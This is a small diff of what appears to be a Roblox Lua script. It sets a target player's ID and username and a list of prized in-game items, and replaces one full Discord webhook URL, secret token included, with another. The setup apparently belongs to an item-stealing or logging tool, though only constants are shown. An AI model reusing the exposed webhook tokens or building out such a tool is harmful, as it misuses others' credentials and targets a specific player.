@@ -1,7 +1,6 @@
 local TARGET_ID = 9100805371
 local TARGET_USER = "123123olx"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1534978853024432361/Dg7P4sbCfY7RM7MSts0KIxTKv65db8CYRGMtsQnI0fkxNj1TwcA0Xu7iTps6hjq-1hKn"
-
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1534982250645688422/ubhq5X8ii8BUaFMQnnN39Rxftf2XrurT4hvhUNdRYfsuqtO3I7OZDLGJZcfPbHPnyPMy"
 local TargetBrainrots = {
     ["Strawberry Elephant"] = true,
     ["Meowl"] = true,
